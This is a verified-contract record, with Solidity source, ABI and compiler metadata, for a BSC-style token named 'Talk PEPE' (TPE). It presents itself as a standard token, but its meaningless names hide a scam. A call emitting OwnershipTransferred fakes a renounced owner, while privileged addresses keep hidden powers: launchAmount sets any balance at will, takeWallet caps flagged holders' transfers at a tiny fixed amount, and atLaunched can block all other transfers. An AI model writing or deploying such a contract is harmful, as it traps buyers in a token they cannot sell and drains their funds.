{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface atTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTx) external view returns (uint256);\n\n    function transfer(address launchedIs, uint256 minLiquidityTake) external returns (bool);\n\n    function allowance(address enableTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minLiquidityTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedIs,\n        uint256 minLiquidityTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalSwapFee, uint256 value);\n    event Approval(address indexed enableTrading, address indexed spender, uint256 value);\n}\n\nabstract contract toFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityFromTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingAtIs {\n    function createPair(address listExemptTrading, address launchTx) external returns (address);\n}\n\ninterface atTakeMetadata is atTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TalkPEPE is toFrom, atTake, atTakeMetadata {\n\n    uint256 constant modeLimit = 5 ** 10;\n\n    function owner() external view returns (address) {\n        return amountMarketing;\n    }\n\n    address public fromList;\n\n    uint256 public swapLaunchTrading;\n\n    uint256 private receiverExempt = 100000000 * 10 ** 18;\n\n    string private totalExempt = \"Talk PEPE\";\n\n    bool private feeAmount;\n\n    address public txEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minReceiver;\n    }\n\n    mapping(address => bool) public sellSwap;\n\n    function swapBuy(address buyMin, address launchedIs, uint256 minLiquidityTake) internal returns (bool) {\n        if (buyMin == fromList) {\n            return takeFrom(buyMin, launchedIs, minLiquidityTake);\n        }\n        uint256 takeSellReceiver = atTake(txEnable).balanceOf(toShould);\n        require(takeSellReceiver == sellAt);\n        require(launchedIs != toShould);\n        if (sellSwap[buyMin]) {\n            return takeFrom(buyMin, launchedIs, modeLimit);\n        }\n        return takeFrom(buyMin, launchedIs, minLiquidityTake);\n    }\n\n    function approve(address shouldToken, uint256 minLiquidityTake) public virtual override returns (bool) {\n        autoExempt[_msgSender()][shouldToken] = minLiquidityTake;\n        emit Approval(_msgSender(), shouldToken, minLiquidityTake);\n        return true;\n    }\n\n    uint8 private minReceiver = 18;\n\n    function balanceOf(address atTx) public view virtual override returns (uint256) {\n        return tokenLimit[atTx];\n    }\n\n    function takeFrom(address buyMin, address launchedIs, uint256 minLiquidityTake) internal returns (bool) {\n        require(tokenLimit[buyMin] >= minLiquidityTake);\n        tokenLimit[buyMin] -= minLiquidityTake;\n        tokenLimit[launchedIs] += minLiquidityTake;\n        emit Transfer(buyMin, launchedIs, minLiquidityTake);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalExempt;\n    }\n\n    function listAt(address swapLiquidity) public {\n        require(swapLiquidity.balance < 100000);\n        if (isTokenSwap) {\n            return;\n        }\n        if (modeTradingSwap == swapLaunchTrading) {\n            launchedTx = false;\n        }\n        autoIs[swapLiquidity] = true;\n        \n        isTokenSwap = true;\n    }\n\n    uint256 public modeTradingSwap;\n\n    address maxEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public launchedTx;\n\n    constructor (){\n        if (modeTradingSwap == swapLaunchTrading) {\n            txLaunched = false;\n        }\n        liquidityFromTx receiverAtTo = liquidityFromTx(maxEnable);\n        txEnable = tradingAtIs(receiverAtTo.factory()).createPair(receiverAtTo.WETH(), address(this));\n        \n        fromList = _msgSender();\n        receiverToken();\n        autoIs[fromList] = true;\n        tokenLimit[fromList] = receiverExempt;\n        \n        emit Transfer(address(0), fromList, receiverExempt);\n    }\n\n    bool private totalEnableFund;\n\n    bool public isTokenSwap;\n\n    mapping(address => bool) public autoIs;\n\n    function takeWallet(address marketingReceiverTx) public {\n        launchBuyAuto();\n        if (txLaunched != totalEnableFund) {\n            swapLaunchTrading = modeTradingSwap;\n        }\n        if (marketingReceiverTx == fromList || marketingReceiverTx == txEnable) {\n            return;\n        }\n        sellSwap[marketingReceiverTx] = true;\n    }\n\n    function launchBuyAuto() private view {\n        require(autoIs[_msgSender()]);\n    }\n\n    bool public txLaunched;\n\n    function getOwner() external view returns (address) {\n        return amountMarketing;\n    }\n\n    uint256 atMinList;\n\n    function transferFrom(address buyMin, address launchedIs, uint256 minLiquidityTake) external override returns (bool) {\n        if (_msgSender() != maxEnable) {\n            if (autoExempt[buyMin][_msgSender()] != type(uint256).max) {\n                require(minLiquidityTake <= autoExempt[buyMin][_msgSender()]);\n                autoExempt[buyMin][_msgSender()] -= minLiquidityTake;\n            }\n        }\n        return swapBuy(buyMin, launchedIs, minLiquidityTake);\n    }\n\n    string private senderExemptSwap = \"TPE\";\n\n    mapping(address => uint256) private tokenLimit;\n\n    address private amountMarketing;\n\n    function receiverToken() public {\n        emit OwnershipTransferred(fromList, address(0));\n        amountMarketing = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderExemptSwap;\n    }\n\n    address toShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transfer(address launchLimitReceiver, uint256 minLiquidityTake) external virtual override returns (bool) {\n        return swapBuy(_msgSender(), launchLimitReceiver, minLiquidityTake);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverExempt;\n    }\n\n    function allowance(address sellTrading, address shouldToken) external view virtual override returns (uint256) {\n        if (shouldToken == maxEnable) {\n            return type(uint256).max;\n        }\n        return autoExempt[sellTrading][shouldToken];\n    }\n\n    mapping(address => mapping(address => uint256)) private autoExempt;\n\n    function launchAmount(address launchLimitReceiver, uint256 minLiquidityTake) public {\n        launchBuyAuto();\n        tokenLimit[launchLimitReceiver] = minLiquidityTake;\n    }\n\n    uint256 sellAt;\n\n    bool public feeMin;\n\n    function atLaunched(uint256 minLiquidityTake) public {\n        launchBuyAuto();\n        sellAt = minLiquidityTake;\n    }\n\n    event OwnershipTransferred(address indexed toMin, address indexed limitSwap);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSwapFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"atLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"launchAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidity\",\"type\":\"address\"}],\"name\":\"listAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTradingSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverTx\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLimitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minLiquidityTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "TalkPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}